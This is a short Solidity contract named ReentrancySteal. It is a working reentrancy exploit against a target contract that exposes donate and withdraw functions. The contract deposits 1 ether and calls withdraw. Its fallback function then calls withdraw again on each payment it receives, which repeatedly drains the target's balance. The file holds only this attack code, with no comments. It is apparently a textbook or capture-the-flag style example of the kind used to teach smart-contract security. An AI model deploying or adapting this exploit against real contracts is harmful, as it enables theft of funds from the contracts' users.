pragma solidity 0.8.0;

interface ReentrancyContract{
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancySteal{
    ReentrancyContract internal reentrancy;
    constructor(ReentrancyContract _reentrancy) {
        reentrancy = _reentrancy;
    }

    function deposit() external payable {
        require(msg.value == 1 ether);
        reentrancy.donate{value: msg.value}(address(this));
    }

    function withdraw() external {
        reentrancy.withdraw(1 ether);
    }

    fallback() external payable {
        reentrancy.withdraw(1 ether);
    }
}